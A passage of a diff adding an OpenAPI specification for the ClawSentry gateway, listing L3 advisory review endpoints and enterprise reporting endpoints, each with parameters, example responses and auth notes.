+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2850",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/l3-advisory/snapshot/{snapshot_id}": {
+      "get": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "读取 L3 snapshot 与冻结记录",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "snapshot_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2863",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/l3-advisory/snapshot/{snapshot_id}/jobs": {
+      "post": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "创建 L3 advisory job",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "snapshot_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2883",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/l3-advisory/reviews": {
+      "post": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "写入 L3 advisory review",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2906",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/l3-advisory/review/{review_id}": {
+      "patch": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "更新 L3 advisory review",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "review_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2950",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/l3-advisory/snapshot/{snapshot_id}/run-local-review": {
+      "post": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "立即运行本地 L3 review",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "snapshot_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3002",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/l3-advisory/job/{job_id}/run-local": {
+      "post": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "运行本地 L3 job",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "job_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3021",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/l3-advisory/job/{job_id}/run-worker": {
+      "post": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "运行 L3 worker job",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "job_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3040",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/report/session/{session_id}/l3-advisory/full-review": {
+      "post": {
+        "tags": [
+          "L3 Advisory"
+        ],
+        "summary": "对 session 发起 operator full review",
+        "description": "Service: `gateway`. Auth: `bearer-disabled-when-empty-token`. CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions. See `api/reporting.md#l3-advisory-endpoints`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "advisory_only": true,
+                  "canonical_decision_mutated": false,
+                  "snapshot_id": "l3snap-001",
+                  "job_id": "l3job-001",
+                  "review_id": "l3adv-001",
+                  "l3_state": "completed"
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3063",
+        "x-clawsentry-markdown-ref": "api/reporting.md#l3-advisory-endpoints",
+        "x-clawsentry-auth-note": "CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.",
+        "requestBody": {
+          "required": true,
+          "content": {
+            "application/json": {
+              "example": {
+                "session_id": "sess-001",
+                "runner": "deterministic_local",
+                "queue_only": false
+              }
+            }
+          }
+        },
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/health": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise enriched health",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2518",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/summary": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise enriched summary",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2553",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/live": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise live snapshot",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2573",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/stream": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise SSE stream",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2638",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/sessions": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise session list",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:2739",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/session/{session_id}/risk": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise session risk",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3106",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/session/{session_id}": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise session replay",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3155",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/session/{session_id}/page": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise paged session replay",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [
+          {
+            "name": "session_id",
+            "in": "path",
+            "required": true,
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3211",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    },
+    "/enterprise/report/alerts": {
+      "get": {
+        "tags": [
+          "Enterprise 条件端点"
+        ],
+        "summary": "Enterprise alerts",
+        "description": "Service: `gateway-enterprise`. Auth: `bearer-disabled-when-empty-token`. Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth. See `api/reporting.md#enterprise-endpoints`.",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "Successful response",
+            "content": {
+              "application/json": {
+                "example": {
+                  "status": "ok",
+                  "data": {}
+                }
+              }
+            }
+          },
+          "400": {
+            "description": "Error 400"
+          },
+          "401": {
+            "description": "Error 401"
+          },
+          "404": {
+            "description": "Error 404"
+          },
+          "429": {
+            "description": "Error 429"
+          }
+        },
+        "x-clawsentry-source": "src/clawsentry/gateway/server.py:3284",
+        "x-clawsentry-markdown-ref": "api/reporting.md#enterprise-endpoints",
+        "x-clawsentry-auth-note": "Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.",
+        "security": [
+          {
+            "BearerAuth": []
+          }
+        ]
+      }
+    }
+  },
+  "x-clawsentry-docs": {
+    "coverage": "api-coverage.json",
+    "source": "scripts/docs_api_inventory.py"
+  }
+}
